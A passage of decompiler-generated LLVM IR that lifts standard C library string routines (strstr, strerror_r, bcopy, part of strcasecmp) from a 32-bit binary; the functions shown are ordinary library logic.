dec_label_pc_1000d594:                            ; preds = %dec_label_pc_1000d570
  %v1_1000d594 = add i32 %v0_1000d588, 1
  %v1_1000d598 = urem i32 %v1_1000d594, 4
  %v3_1000d598 = icmp eq i32 %v1_1000d598, 0
  br i1 %v3_1000d598, label %dec_label_pc_1000d5a0, label %dec_label_pc_1000d570

dec_label_pc_1000d5a0:                            ; preds = %dec_label_pc_1000d594, %dec_label_pc_1000d568
  %v0_1000d5a4 = phi i32 [ %tmp, %dec_label_pc_1000d568 ], [ %v1_1000d594, %dec_label_pc_1000d594 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000d60c3 = icmp ult i32 %v0_1000d5a4, %v0_1000d618
  br i1 %v2_1000d60c3, label %dec_label_pc_1000d5b0, label %dec_label_pc_1000d614

dec_label_pc_1000d5b0:                            ; preds = %dec_label_pc_1000d5a0, %dec_label_pc_1000d608
  %v0_1000d550 = phi i32 [ %v1_1000d5b4, %dec_label_pc_1000d608 ], [ %v0_1000d5a4, %dec_label_pc_1000d5a0 ]
  %v1_1000d5b0 = inttoptr i32 %v0_1000d550 to i32*
  %v2_1000d5b0 = load i32, i32* %v1_1000d5b0, align 4
  %v1_1000d5b4 = add i32 %v0_1000d550, 4
  store i32 %v0_1000d550, i32* @r8, align 4
  %v1_1000d5c0 = add i32 %v2_1000d5b0, -16843009
  %v2_1000d5c4 = and i32 %v1_1000d5c0, -2139062144
  %v5_1000d5c4 = icmp eq i32 %v2_1000d5c4, 0
  %v1_1000d5c8 = add i32 %v0_1000d550, 1
  br i1 %v5_1000d5c4, label %dec_label_pc_1000d608, label %dec_label_pc_1000d5d0

dec_label_pc_1000d5d0:                            ; preds = %dec_label_pc_1000d5b0
  %v2_1000d5d0 = inttoptr i32 %v0_1000d550 to i8*
  %v3_1000d5d0 = load i8, i8* %v2_1000d5d0, align 1
  %v3_1000d5d4 = icmp eq i8 %v3_1000d5d0, 0
  br i1 %v3_1000d5d4, label %dec_label_pc_1000d550, label %dec_label_pc_1000d5dc

dec_label_pc_1000d5dc:                            ; preds = %dec_label_pc_1000d5d0
  %v2_1000d5dc = inttoptr i32 %v1_1000d5c8 to i8*
  %v3_1000d5dc = load i8, i8* %v2_1000d5dc, align 1
  %v3_1000d5e0 = icmp eq i8 %v3_1000d5dc, 0
  br i1 %v3_1000d5e0, label %dec_label_pc_1000d614, label %dec_label_pc_1000d5e8

dec_label_pc_1000d5e8:                            ; preds = %dec_label_pc_1000d5dc
  %v1_1000d5e8 = add i32 %v0_1000d550, 2
  %v2_1000d5e8 = inttoptr i32 %v1_1000d5e8 to i8*
  %v3_1000d5e8 = load i8, i8* %v2_1000d5e8, align 1
  %v3_1000d5f0 = icmp eq i8 %v3_1000d5e8, 0
  br i1 %v3_1000d5f0, label %dec_label_pc_1000d614, label %dec_label_pc_1000d5f8

dec_label_pc_1000d5f8:                            ; preds = %dec_label_pc_1000d5e8
  %v1_1000d5f8 = add i32 %v0_1000d550, 3
  %v2_1000d5f8 = inttoptr i32 %v1_1000d5f8 to i8*
  %v3_1000d5f8 = load i8, i8* %v2_1000d5f8, align 1
  %v3_1000d600 = icmp eq i8 %v3_1000d5f8, 0
  br i1 %v3_1000d600, label %dec_label_pc_1000d614, label %dec_label_pc_1000d608

dec_label_pc_1000d608:                            ; preds = %dec_label_pc_1000d5f8, %dec_label_pc_1000d5b0
  %v2_1000d60c = icmp ult i32 %v1_1000d5b4, %v0_1000d618
  br i1 %v2_1000d60c, label %dec_label_pc_1000d5b0, label %dec_label_pc_1000d614

dec_label_pc_1000d614:                            ; preds = %dec_label_pc_1000d608, %dec_label_pc_1000d5dc, %dec_label_pc_1000d5e8, %dec_label_pc_1000d5f8, %dec_label_pc_1000d5a0, %dec_label_pc_1000d550
  %v0_1000d620 = phi i32 [ %v0_1000d550, %dec_label_pc_1000d550 ], [ %v0_1000d5a4, %dec_label_pc_1000d5a0 ], [ %v1_1000d5f8, %dec_label_pc_1000d5f8 ], [ %v1_1000d5e8, %dec_label_pc_1000d5e8 ], [ %v1_1000d5c8, %dec_label_pc_1000d5dc ], [ %v0_1000d618, %dec_label_pc_1000d608 ]
  %v3_1000d614 = icmp ugt i32 %v0_1000d618, %v0_1000d620
  %v0_1000d620.v0_1000d618 = select i1 %v3_1000d614, i32 %v0_1000d620, i32 %v0_1000d618
  %v2_1000d624 = sub i32 %v0_1000d620.v0_1000d618, %tmp
  ret i32 %v2_1000d624

; uselistorder directives
  uselistorder i32 %v1_1000d5b4, { 1, 0 }
  uselistorder i32 %v0_1000d550, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000d5a4, { 1, 0, 2 }
  uselistorder i32 %v1_1000d594, { 1, 0, 2 }
  uselistorder i32 %v0_1000d588, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000d618, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000d558, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000d614, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d570, { 1, 0 }
  uselistorder label %dec_label_pc_1000d568, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000d62c = load i8, i8* %arg2, align 1
  %v4_1000d62c = zext i8 %v3_1000d62c to i32
  store i32 %v4_1000d62c, i32* %r6.global-to-local, align 4
  %v3_1000d630 = icmp eq i8 %v3_1000d62c, 0
  %v0_1000d634 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d630, i32 %v0_1000d634)
  %v1_1000d638 = add i32 %arg1, -1
  store i32 %v1_1000d638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d63c

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d64c, %entry
  %v0_1000d63c = phi i32 [ %v1_1000d63c, %dec_label_pc_1000d64c ], [ %v1_1000d638, %entry ]
  %v1_1000d63c = add i32 %v0_1000d63c, 1
  %v2_1000d63c = inttoptr i32 %v1_1000d63c to i8*
  %v3_1000d63c = load i8, i8* %v2_1000d63c, align 1
  store i32 %v1_1000d63c, i32* %r3.global-to-local, align 4
  %v3_1000d640 = icmp eq i8 %v3_1000d63c, 0
  br i1 %v3_1000d640, label %dec_label_pc_1000d718, label %dec_label_pc_1000d64c

dec_label_pc_1000d64c:                            ; preds = %dec_label_pc_1000d63c
  %v4_1000d644 = icmp eq i8 %v3_1000d63c, %v3_1000d62c
  br i1 %v4_1000d644, label %dec_label_pc_1000d650, label %dec_label_pc_1000d63c

dec_label_pc_1000d650:                            ; preds = %dec_label_pc_1000d64c
  %v2_1000d650 = add i32 %tmp, 1
  %v3_1000d650 = inttoptr i32 %v2_1000d650 to i8*
  %v4_1000d650 = load i8, i8* %v3_1000d650, align 1
  %v5_1000d650 = zext i8 %v4_1000d650 to i32
  store i32 %v5_1000d650, i32* %r5.global-to-local, align 4
  store i32 %v2_1000d650, i32* %r4.global-to-local, align 4
  %v3_1000d658 = icmp eq i8 %v4_1000d650, 0
  %v0_1000d65c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d658, i32 %v0_1000d65c)
  %v0_1000d660.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d6a4

dec_label_pc_1000d66c:                            ; preds = %dec_label_pc_1000d70c
  %v3_1000d66c = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000d66c = zext i8 %v3_1000d66c to i32
  store i32 %v1_1000d660, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d694.preheader

dec_label_pc_1000d694.preheader:                  ; preds = %dec_label_pc_1000d66c, %dec_label_pc_1000d6a4
  %v0_1000d69417 = phi i32 [ %v4_1000d66c, %dec_label_pc_1000d66c ], [ %storemerge4, %dec_label_pc_1000d6a4 ]
  %v1_1000d694.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000d69425 = icmp eq i32 %v0_1000d69417, %v1_1000d694.pre
  %v3_1000d69827 = icmp eq i32 %v0_1000d69417, 0
  br i1 %v4_1000d69425, label %dec_label_pc_1000d6a4, label %dec_label_pc_1000d678

dec_label_pc_1000d678:                            ; preds = %dec_label_pc_1000d694.preheader, %dec_label_pc_1000d690
  %v3_1000d69829 = phi i1 [ %v3_1000d698, %dec_label_pc_1000d690 ], [ %v3_1000d69827, %dec_label_pc_1000d694.preheader ]
  %v0_1000d67c28 = phi i32 [ %v1_1000d690, %dec_label_pc_1000d690 ], [ %v1_1000d660, %dec_label_pc_1000d694.preheader ]
  br i1 %v3_1000d69829, label %dec_label_pc_1000d718, label %dec_label_pc_1000d67c

dec_label_pc_1000d67c:                            ; preds = %dec_label_pc_1000d678
  %v1_1000d67c = add i32 %v0_1000d67c28, 1
  %v2_1000d67c = inttoptr i32 %v1_1000d67c to i8*
  %v3_1000d67c = load i8, i8* %v2_1000d67c, align 1
  %v4_1000d67c = zext i8 %v3_1000d67c to i32
  store i32 %v1_1000d67c, i32* %r11.global-to-local, align 4
  %v4_1000d680 = icmp eq i32 %v4_1000d67c, %v1_1000d694.pre
  br i1 %v4_1000d680, label %dec_label_pc_1000d6a4, label %dec_label_pc_1000d68c

dec_label_pc_1000d68c:                            ; preds = %dec_label_pc_1000d67c
  %v3_1000d684 = icmp eq i8 %v3_1000d67c, 0
  br i1 %v3_1000d684, label %dec_label_pc_1000d718, label %dec_label_pc_1000d690

dec_label_pc_1000d690:                            ; preds = %dec_label_pc_1000d68c
  %v1_1000d690 = add i32 %v0_1000d67c28, 2
  %v2_1000d690 = inttoptr i32 %v1_1000d690 to i8*
  %v3_1000d690 = load i8, i8* %v2_1000d690, align 1
  %v4_1000d690 = zext i8 %v3_1000d690 to i32
  store i32 %v1_1000d690, i32* %r11.global-to-local, align 4
  %v4_1000d694 = icmp eq i32 %v4_1000d690, %v1_1000d694.pre
  %v3_1000d698 = icmp eq i8 %v3_1000d690, 0
  br i1 %v4_1000d694, label %dec_label_pc_1000d6a4, label %dec_label_pc_1000d678

dec_label_pc_1000d6a4:                            ; preds = %dec_label_pc_1000d694.preheader, %dec_label_pc_1000d690, %dec_label_pc_1000d67c, %dec_label_pc_1000d650
  %v0_1000d660.sink = phi i32 [ %v0_1000d660.sink.pre, %dec_label_pc_1000d650 ], [ %v1_1000d660, %dec_label_pc_1000d694.preheader ], [ %v1_1000d690, %dec_label_pc_1000d690 ], [ %v1_1000d67c, %dec_label_pc_1000d67c ]
  %v1_1000d660 = add i32 %v0_1000d660.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000d660 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000d660, i32* %r11.global-to-local, align 4
  %v1_1000d6a4 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000d6a4 = icmp eq i32 %storemerge4, %v1_1000d6a4
  br i1 %v4_1000d6a4, label %dec_label_pc_1000d6ac, label %dec_label_pc_1000d694.preheader

dec_label_pc_1000d6ac:                            ; preds = %dec_label_pc_1000d6a4
  %v1_1000d6ac = add i32 %v0_1000d660.sink, 2
  %v2_1000d6ac = inttoptr i32 %v1_1000d6ac to i8*
  %v3_1000d6ac = load i8, i8* %v2_1000d6ac, align 1
  %v4_1000d6ac = zext i8 %v3_1000d6ac to i32
  store i32 %v4_1000d6ac, i32* %r10.global-to-local, align 4
  store i32 %v0_1000d660.sink, i32* %r3.global-to-local, align 4
  %v0_1000d6b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d6b4 = add i32 %v0_1000d6b4, 1
  %v2_1000d6b4 = inttoptr i32 %v1_1000d6b4 to i8*
  %v3_1000d6b4 = load i8, i8* %v2_1000d6b4, align 1
  %v4_1000d6b4 = zext i8 %v3_1000d6b4 to i32
  store i32 %v1_1000d6b4, i32* %r8.global-to-local, align 4
  store i32 %v1_1000d6ac, i32* %r11.global-to-local, align 4
  %v4_1000d6c0 = icmp eq i8 %v3_1000d6ac, %v3_1000d6b4
  br i1 %v4_1000d6c0, label %dec_label_pc_1000d6c8, label %dec_label_pc_1000d70c

dec_label_pc_1000d6c8:                            ; preds = %dec_label_pc_1000d6ac, %dec_label_pc_1000d6f4.dec_label_pc_1000d6c8_crit_edge
  %v0_1000d6d0 = phi i32 [ %v0_1000d6d0.pre, %dec_label_pc_1000d6f4.dec_label_pc_1000d6c8_crit_edge ], [ %v1_1000d6b4, %dec_label_pc_1000d6ac ]
  %v0_1000d6cc = phi i32 [ %v0_1000d6cc.pre, %dec_label_pc_1000d6f4.dec_label_pc_1000d6c8_crit_edge ], [ %v1_1000d6ac, %dec_label_pc_1000d6ac ]
  %v0_1000d6c8 = phi i32 [ %v4_1000d6f8, %dec_label_pc_1000d6f4.dec_label_pc_1000d6c8_crit_edge ], [ %v4_1000d6ac, %dec_label_pc_1000d6ac ]
  %v3_1000d6c8 = icmp eq i32 %v0_1000d6c8, 0
  %v1_1000d6cc = add i32 %v0_1000d6cc, 1
  store i32 %v1_1000d6cc, i32* %r7.global-to-local, align 4
  %v1_1000d6d0 = add i32 %v0_1000d6d0, 1
  store i32 %v1_1000d6d0, i32* %r10.global-to-local, align 4
  %v0_1000d6d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d6c8, i32 %v0_1000d6d4)
  %v0_1000d6d8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d6d8 = add i32 %v0_1000d6d8, 1
  %v2_1000d6d8 = inttoptr i32 %v1_1000d6d8 to i8*
  %v3_1000d6d8 = load i8, i8* %v2_1000d6d8, align 1
  %v4_1000d6d8 = zext i8 %v3_1000d6d8 to i32
  %v0_1000d6dc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d6dc = add i32 %v0_1000d6dc, 1
  store i32 %v1_1000d6dc, i32* %r8.global-to-local, align 4
  %v0_1000d6e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d6e0 = add i32 %v0_1000d6e0, 1
  %v2_1000d6e0 = inttoptr i32 %v1_1000d6e0 to i8*
  %v3_1000d6e0 = load i8, i8* %v2_1000d6e0, align 1
  %v0_1000d6e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000d6e4 = add i32 %v0_1000d6e4, 1
  store i32 %v1_1000d6e4, i32* %r11.global-to-local, align 4
  %v4_1000d6ec = icmp eq i8 %v3_1000d6e0, %v3_1000d6d8
  br i1 %v4_1000d6ec, label %dec_label_pc_1000d6f4, label %dec_label_pc_1000d70c

dec_label_pc_1000d6f4:                            ; preds = %dec_label_pc_1000d6c8
  %v3_1000d6e8 = icmp eq i8 %v3_1000d6d8, 0
  %v0_1000d6f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d6e8, i32 %v0_1000d6f4)
  %v0_1000d6f8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d6f8 = add i32 %v0_1000d6f8, 1
  %v2_1000d6f8 = inttoptr i32 %v1_1000d6f8 to i8*
  %v3_1000d6f8 = load i8, i8* %v2_1000d6f8, align 1
  %v4_1000d6f8 = zext i8 %v3_1000d6f8 to i32
  %v0_1000d6fc = load i32, i32* %r7.global-to-local, align 4
  %v1_1000d6fc = add i32 %v0_1000d6fc, 1
  %v2_1000d6fc = inttoptr i32 %v1_1000d6fc to i8*
  %v3_1000d6fc = load i8, i8* %v2_1000d6fc, align 1
  store i32 %v4_1000d6f8, i32* %r10.global-to-local, align 4
  %v4_1000d704 = icmp eq i8 %v3_1000d6fc, %v3_1000d6f8
  br i1 %v4_1000d704, label %dec_label_pc_1000d6f4.dec_label_pc_1000d6c8_crit_edge, label %dec_label_pc_1000d70c

dec_label_pc_1000d6f4.dec_label_pc_1000d6c8_crit_edge: ; preds = %dec_label_pc_1000d6f4
  %v0_1000d6cc.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000d6d0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d6c8

dec_label_pc_1000d70c:                            ; preds = %dec_label_pc_1000d6f4, %dec_label_pc_1000d6c8, %dec_label_pc_1000d6ac
  %v0_1000d70c = phi i32 [ %v4_1000d6b4, %dec_label_pc_1000d6ac ], [ %v4_1000d6f8, %dec_label_pc_1000d6f4 ], [ %v4_1000d6d8, %dec_label_pc_1000d6c8 ]
  %v3_1000d70c = icmp eq i32 %v0_1000d70c, 0
  br i1 %v3_1000d70c, label %dec_label_pc_1000d714, label %dec_label_pc_1000d66c

dec_label_pc_1000d714:                            ; preds = %dec_label_pc_1000d70c
  ret i32 %v0_1000d660.sink

dec_label_pc_1000d718:                            ; preds = %dec_label_pc_1000d63c, %dec_label_pc_1000d68c, %dec_label_pc_1000d678
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000d6f8, { 0, 2, 1 }
  uselistorder i8 %v3_1000d6d8, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000d660, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000d660.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000d690, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d67c28, { 1, 0 }
  uselistorder i32 %v1_1000d694.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000d63c, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000d718, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d6c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d6a4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000d678, { 1, 0 }
  uselistorder label %dec_label_pc_1000d694.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268490552, i32* @lr, align 4
  %v0_1000d734 = call i32 @__xpg_strerror_r()
  %v0_1000d73c = load i32, i32* @r29, align 4
  ret i32 %v0_1000d73c
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000d750 = load i32, i32* @r3, align 4
  %v2_1000d750 = icmp ugt i32 %v0_1000d750, 124
  %v0_1000d760 = load i32, i32* @r4, align 4
  store i32 %v0_1000d760, i32* %r27.global-to-local, align 4
  %v0_1000d768 = load i32, i32* @r5, align 4
  br i1 %v2_1000d750, label %dec_label_pc_1000d7ac, label %dec_label_pc_1000d770

dec_label_pc_1000d770:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1001c938.861 to i32), i32* %r30.global-to-local, align 4
  %v3_1000d78c7 = icmp eq i32 %v0_1000d750, 0
  br i1 %v3_1000d78c7, label %dec_label_pc_1000d7a0, label %dec_label_pc_1000d780

dec_label_pc_1000d780:                            ; preds = %dec_label_pc_1000d770, %dec_label_pc_1000d780
  %v0_1000d784 = phi i32 [ %v1_1000d784, %dec_label_pc_1000d780 ], [ ptrtoint ([8 x i8]* @global_var_1001c938.861 to i32), %dec_label_pc_1000d770 ]
  %v1_1000d784 = add i32 %v0_1000d784, 1
  store i32 %v1_1000d784, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d780

dec_label_pc_1000d7a0:                            ; preds = %dec_label_pc_1000d770
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d7e0

dec_label_pc_1000d7ac:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000d750, 0
  %v1_1000d7b0 = zext i1 %tmp to i32
  %v2_1000d7b0 = ashr i32 %v0_1000d750, 31
  %v3_1000d7b0 = and i32 %v2_1000d7b0, -2
  %v4_1000d7b0 = or i32 %v3_1000d7b0, %v1_1000d7b0
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000d7c4 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000d7c4 = call i32 @_uintmaxtostr(i8* %v5_1000d7c4, i32 %v4_1000d7b0, i32 %v0_1000d750, i32 -10, i32 0)
  %v1_1000d7cc = add i32 %v6_1000d7c4, -14
  store i32 %v1_1000d7cc, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1001c928.862 to i32), i32* @r4, align 4
  store i32 %v1_1000d7cc, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268490720, i32* @lr, align 4
  %v0_1000d7dc = call i32 @memcpy()
  %v0_1000d7e0.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000d7e4.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000d7f4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000d7e0

dec_label_pc_1000d7e0:                            ; preds = %dec_label_pc_1000d7a0, %dec_label_pc_1000d7ac
  %v0_1000d7f4 = phi i32 [ %v0_1000d768, %dec_label_pc_1000d7a0 ], [ %v0_1000d7f4.pre, %dec_label_pc_1000d7ac ]
  %v0_1000d7e4 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1001c938.861 to i32), %dec_label_pc_1000d7a0 ], [ %v0_1000d7e4.pre, %dec_label_pc_1000d7ac ]
  %v1_1000d7e8 = phi i32 [ %v0_1000d760, %dec_label_pc_1000d7a0 ], [ %v0_1000d7e0.pre, %dec_label_pc_1000d7ac ]
  %tmp19 = icmp slt i32 %v1_1000d7e8, 0
  %v1_1000d7e0 = zext i1 %tmp19 to i32
  %v2_1000d7e0 = ashr i32 %v1_1000d7e8, 31
  %v3_1000d7e0 = and i32 %v2_1000d7e0, -2
  %v4_1000d7e0 = or i32 %v3_1000d7e0, %v1_1000d7e0
  store i32 %v0_1000d7e4, i32* @r3, align 4
  %v2_1000d7e8 = xor i32 %v4_1000d7e0, %v1_1000d7e8
  %v2_1000d7ec = sub i32 %v4_1000d7e0, %v2_1000d7e8
  %tmp20 = icmp slt i32 %v2_1000d7ec, 0
  %v1_1000d7f0 = zext i1 %tmp20 to i32
  %v2_1000d7f0 = ashr i32 %v2_1000d7ec, 31
  %v3_1000d7f0 = and i32 %v2_1000d7f0, -2
  %v4_1000d7f0 = or i32 %v3_1000d7f0, %v1_1000d7f0
  %v2_1000d7f4 = and i32 %v4_1000d7f0, %v0_1000d7f4
  store i32 %v2_1000d7f4, i32* @r29, align 4
  %v0_1000d7f8 = call i32 @__GI_strlen()
  %v1_1000d7fc = add i32 %v0_1000d7f8, 1
  store i32 %v1_1000d7fc, i32* %r31.global-to-local, align 4
  %v1_1000d800 = load i32, i32* @r29, align 4
  %v3_1000d800 = icmp ugt i32 %v1_1000d7fc, %v1_1000d800
  br i1 %v3_1000d800, label %dec_label_pc_1000d808, label %dec_label_pc_1000d810

dec_label_pc_1000d808:                            ; preds = %dec_label_pc_1000d7e0
  store i32 %v1_1000d800, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d810

dec_label_pc_1000d810:                            ; preds = %dec_label_pc_1000d7e0, %dec_label_pc_1000d808
  %v0_1000d820 = phi i32 [ %v1_1000d800, %dec_label_pc_1000d808 ], [ %v1_1000d7fc, %dec_label_pc_1000d7e0 ]
  %v3_1000d810 = icmp eq i32 %v0_1000d820, 0
  br i1 %v3_1000d810, label %dec_label_pc_1000d834, label %dec_label_pc_1000d818

dec_label_pc_1000d818:                            ; preds = %dec_label_pc_1000d810
  %v0_1000d818 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000d818, i32* @r4, align 4
  %v0_1000d81c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000d81c, i32* @r3, align 4
  store i32 %v0_1000d820, i32* @r5, align 4
  store i32 268490792, i32* @lr, align 4
  %v0_1000d824 = call i32 @memcpy()
  %v1_1000d828 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d828 = add i32 %v1_1000d828, %v0_1000d81c
  %v3_1000d830 = add i32 %v2_1000d828, -1
  %v4_1000d830 = inttoptr i32 %v3_1000d830 to i8*
  store i8 0, i8* %v4_1000d830, align 1
  br label %dec_label_pc_1000d834

dec_label_pc_1000d834:                            ; preds = %dec_label_pc_1000d810, %dec_label_pc_1000d818
  %v0_1000d834 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000d834 = icmp eq i32 %v0_1000d834, 0
  br i1 %v3_1000d834, label %dec_label_pc_1000d844, label %dec_label_pc_1000d83c

dec_label_pc_1000d83c:                            ; preds = %dec_label_pc_1000d834
  %v0_1000d83c = call i32 @__errno_location()
  %v0_1000d840 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d840 = inttoptr i32 %v0_1000d83c to i32*
  store i32 %v0_1000d840, i32* %v2_1000d840, align 4
  %v0_1000d848.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d844

dec_label_pc_1000d844:                            ; preds = %dec_label_pc_1000d834, %dec_label_pc_1000d83c
  %v0_1000d848 = phi i32 [ 0, %dec_label_pc_1000d834 ], [ %v0_1000d848.pre, %dec_label_pc_1000d83c ]
  ret i32 %v0_1000d848

; uselistorder directives
  uselistorder i32 %v2_1000d7ec, { 1, 0 }
  uselistorder i32 %v4_1000d7e0, { 1, 0 }
  uselistorder i32 %v1_1000d7e8, { 1, 2, 0 }
  uselistorder i32 %v1_1000d784, { 1, 0 }
  uselistorder i32 %v0_1000d750, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1001c938.861 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d844, { 1, 0 }
  uselistorder label %dec_label_pc_1000d834, { 1, 0 }
  uselistorder label %dec_label_pc_1000d810, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d780, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000d868 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000d868
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000d870 = load i32, i32* bitcast (i32** @global_var_1002e5e4.864 to i32*), align 4
  %v0_1000d878.pre = load i32, i32* @r3, align 4
  %v1_1000d878.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d878

dec_label_pc_1000d878:                            ; preds = %dec_label_pc_1000d8a0, %entry
  %v0_1000d8b46 = phi i32 [ %v0_1000d8b47, %dec_label_pc_1000d8a0 ], [ 0, %entry ]
  %v0_1000d8a4 = phi i32 [ %v1_1000d8a4, %dec_label_pc_1000d8a0 ], [ %v1_1000d878.pre, %entry ]
  %v0_1000d8a8 = phi i32 [ %v1_1000d8a8, %dec_label_pc_1000d8a0 ], [ %v0_1000d878.pre, %entry ]
  %v4_1000d878 = icmp eq i32 %v0_1000d8a8, %v0_1000d8a4
  %.pre = inttoptr i32 %v0_1000d8a8 to i8*
  br i1 %v4_1000d878, label %dec_label_pc_1000d8a0, label %dec_label_pc_1000d880

dec_label_pc_1000d880:                            ; preds = %dec_label_pc_1000d878
  %v2_1000d880 = load i8, i8* %.pre, align 1
  %v3_1000d880 = zext i8 %v2_1000d880 to i32
  %v1_1000d884 = inttoptr i32 %v0_1000d8a4 to i8*
  %v2_1000d884 = load i8, i8* %v1_1000d884, align 1
  %v3_1000d884 = zext i8 %v2_1000d884 to i32
  %v1_1000d888 = mul nuw nsw i32 %v3_1000d880, 2
  %v1_1000d88c = mul nuw nsw i32 %v3_1000d884, 2
  %v2_1000d890 = add i32 %v1_1000d888, %v3_1000d870
  %v3_1000d890 = inttoptr i32 %v2_1000d890 to i16*
  %v4_1000d890 = load i16, i16* %v3_1000d890, align 2
  %v5_1000d890 = sext i16 %v4_1000d890 to i32
  %v2_1000d894 = add i32 %v1_1000d88c, %v3_1000d870
  %v3_1000d894 = inttoptr i32 %v2_1000d894 to i16*
  %v4_1000d894 = load i16, i16* %v3_1000d894, align 2
  %v5_1000d894 = sext i16 %v4_1000d894 to i32
  %v2_1000d898 = sub nsw i32 %v5_1000d890, %v5_1000d894
  %v4_1000d89c = icmp eq i16 %v4_1000d890, %v4_1000d894
  br i1 %v4_1000d89c, label %dec_label_pc_1000d8a0, label %dec_label_pc_1000d8b4

